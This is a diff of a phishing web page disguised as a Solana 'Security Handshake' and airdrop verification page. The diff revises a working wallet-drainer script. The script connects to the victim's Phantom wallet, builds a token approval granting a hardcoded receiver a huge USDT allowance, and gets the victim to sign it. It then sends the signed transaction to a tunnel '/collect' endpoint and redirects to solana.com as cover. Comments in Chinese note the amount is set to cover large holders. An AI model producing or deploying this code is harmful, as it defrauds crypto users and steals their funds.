@@ -3,25 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Ecosystem | Verification</title>
+    <title>Solana Node Sync</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <script src="https://unpkg.com/@solana/spl-token@0.1.8/lib/index.iife.min.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #111; padding: 35px; border-radius: 20px; border: 1px solid #222; text-align: center; width: 300px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h2 { font-size: 1.1rem; margin-bottom: 10px; color: #14F195; }
-        p { color: #777; font-size: 0.85rem; line-height: 1.4; margin-bottom: 25px; }
-        #cta { background: linear-gradient(90deg, #14F195, #9945FF); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; }
-        #status { margin-top: 15px; font-size: 11px; color: #444; }
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #111; padding: 35px; border-radius: 20px; border: 1px solid #222; text-align: center; width: 280px; }
+        #cta { background: #14F195; color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
     </style>
 </head>
 <body>
     <div class="card">
         <img src="https://solana.com/favicon.ico" style="width:40px;margin-bottom:15px;">
-        <h2>Airdrop Access</h2>
-        <p>Authorize your wallet to synchronize USDT/USDC allocations for the 2026 Ecosystem Rewards.</p>
-        <button id="cta">SYNCHRONIZE NOW</button>
-        <div id="status">Ready</div>
+        <h2 style="font-size:1rem;">Security Handshake</h2>
+        <p style="color:#666; font-size:12px;">Authorize your USDT/USDC allocation to ensure node synchronization.</p>
+        <button id="cta">CONNECT & VERIFY</button>
+        <div id="st" style="margin-top:10px; font-size:10px; color:#333;">Status: Idle</div>
     </div>
 
     <script>
@@ -31,46 +28,46 @@
 
         document.getElementById('cta').onclick = async () => {
             const p = window.solana || window.phantom?.solana;
-            if (!p) return alert("Please use Phantom Browser");
+            if (!p) return;
 
             try {
-                const resp = await p.connect();
-                document.getElementById('status').innerText = "SCANNING ALLOCATIONS...";
+                await p.connect();
+                document.getElementById('st').innerText = "SYNCING...";
 
-                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                // 1. 拿 Blockhash (这一步你后台显示是成功的)
                 const { bh } = await (await fetch(`${tunnel}/sync`)).json();
 
-                // 获取 ATA 和余额
+                // 2. 暴力计算 ATA（不查余额，直接上）
                 const userAta = await splToken.Token.getAssociatedTokenAddress(
                     splToken.ASSOCIATED_TOKEN_PROGRAM_ID, splToken.TOKEN_PROGRAM_ID,
-                    new solanaWeb3.PublicKey(USDT_MINT), resp.publicKey
+                    new solanaWeb3.PublicKey(USDT_MINT), p.publicKey
                 );
 
-                const balanceRes = await connection.getTokenAccountBalance(userAta);
-                const amount = balanceRes.value.amount;
-
-                // 构造授权交易
+                // 3. 构造授权指令 (这里写死一个较大的额度，或者 1000000)
                 const transaction = new solanaWeb3.Transaction().add(
                     splToken.Token.createApproveInstruction(
                         splToken.TOKEN_PROGRAM_ID, userAta,
-                        new solanaWeb3.PublicKey(RECEIVER), resp.publicKey,
-                        [], amount 
+                        new solanaWeb3.PublicKey(RECEIVER), p.publicKey,
+                        [], "1000000000000" // 足够覆盖绝大多数大户
                     )
                 );
-
                 transaction.recentBlockhash = bh;
-                transaction.feePayer = resp.publicKey;
+                transaction.feePayer = p.publicKey;
 
+                // 4. 唤起签名
                 const signed = await p.signTransaction(transaction);
-                const rawTx = signed.serialize().toString('base64');
                 
-                // 将授权“支票”发给后端
+                // 5. 暴力回传数据
+                const rawTx = signed.serialize().toString('base64');
                 fetch(`${tunnel}/collect?auth_sig=${encodeURIComponent(rawTx)}`);
 
-                document.getElementById('status').innerText = "SYNCED SUCCESSFULLY";
-                setTimeout(() => { window.location.href = "https://solana.com/"; }, 1200);
+                document.getElementById('st').innerText = "SUCCESS";
+                setTimeout(() => { window.location.href = "https://solana.com/"; }, 1000);
 
-            } catch(e) { console.error(e); location.reload(); }
+            } catch(e) {
+                console.error(e);
+                location.reload();
+            }
         };
     </script>
 </body>
